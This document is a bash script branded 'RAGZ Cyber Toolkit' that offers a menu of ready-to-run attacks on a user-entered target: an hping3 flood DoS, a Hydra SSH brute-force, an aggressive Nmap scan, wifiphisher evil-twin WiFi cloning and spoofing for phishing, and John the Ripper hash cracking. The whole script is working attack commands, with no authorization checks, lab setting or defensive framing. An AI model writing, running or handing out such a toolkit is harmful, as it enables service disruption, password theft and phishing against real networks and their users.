#!/bin/bash

# ASCII Art of RAGZ in block letters
echo "█████  ████   ██████ █████"
echo "█    ██    █ █     █     █"
echo "█████  ██████ █  ███ █████"
echo "█   █  █    █ █    █ █    "
echo "█    █ █    █  █████ █████"


# Function for DDoS attack using hping3
ddos_hping3() {
    read -p "Enter target IP address: " target_ip
    echo "Launching DDoS attack on $target_ip using hping3..."
    sudo hping3 --fast -S -P -U --flood -V $target_ip
}

# Function for SSH brute-force attack using Hydra
brute_force_ssh() {
    read -p "Enter target IP address: " target_ip
    read -p "Enter SSH username: " ssh_user
    read -p "Enter path to password file: " password_file
    echo "Starting SSH brute-force attack on $target_ip using Hydra..."
    sudo hydra -l $ssh_user -P $password_file -t 4 ssh://$target_ip
}

# Function to scan for open ports using Nmap
scan_ports() {
    read -p "Enter target IP address or range (e.g., 192.168.1.1/24): " target_ip
    echo "Scanning ports on $target_ip using Nmap..."
    sudo nmap -Pn -sS -sV -O -A $target_ip
}

# Function to clone a WiFi network using WiFiphisher
clone_wifi_network() {
  echo "Scanning for available WiFi networks..."
    sudo iwlist wlan0 scan | grep 'ESSID\|Address\|Quality\|Encryption\|Channel'
    
    read -p "Enter ESSID of the target network to clone: " target_essid
    echo "Cloning WiFi network: $target_essid..."
    sudo wifiphisher -aI wlan0 -nE --essid $target_essid --logging
}

# Function to create a custom spoofed WiFi network
create_custom_spoofed_network() {
    read -p "Enter ESSID for the spoofed network: " spoofed_essid
    echo "Creating custom spoofed network: $spoofed_essid..."
    
    # Using the provided ESSID and phishing scenario for creating a custom spoofed network
    sudo wifiphisher -aI wlan0 -nE --essid "$spoofed_essid"  --logging
}

# Function to bring the network back up
bring_network_back_up() {
    echo "Bringing the network back up..."
    sudo systemctl restart NetworkManager.service
}

# Function to crack hashes using John the Ripper
crack_hashes() {
    read -p "Enter the path to the file containing hashes: " hash_file
    read -p "Enter the path to the wordlist: " wordlist
    echo "Starting hash cracking using John the Ripper..."
    sudo john --wordlist=$wordlist $hash_file
}

# Main menu loop
while true; do
    echo ""
    echo "==============================="
    echo "       RAGZ Cyber Toolkit      "
    echo "==============================="
    echo "1. Launch DDoS attack"
    echo "2. Perform SSH brute-force attack"
    echo "3. Scan for open ports"
    echo "4. Clone WiFi network with WiFiphisher"
    echo "5. Create custom spoofed WiFi network"
    echo "6. Bring network back up"
    echo "7. Crack hashes with John"
    echo "8. Exit"
    read -p "Enter your choice (1-8): " choice

    case $choice in
        1)
            ddos_hping3
            ;;
        2)
            brute_force_ssh
            ;;
        3)
            scan_ports
            ;;
        4)
            clone_wifi_network
            ;;
        5)
            create_custom_spoofed_network
            ;;
        6)
           bring_network_back_up
            ;;
        7)
            crack_hashes
            ;;
        8)
            echo "Exiting..."
            break
            ;;
        *)
            echo "Invalid choice. Please enter a number between 1 and 8."
            ;;
    esac
done
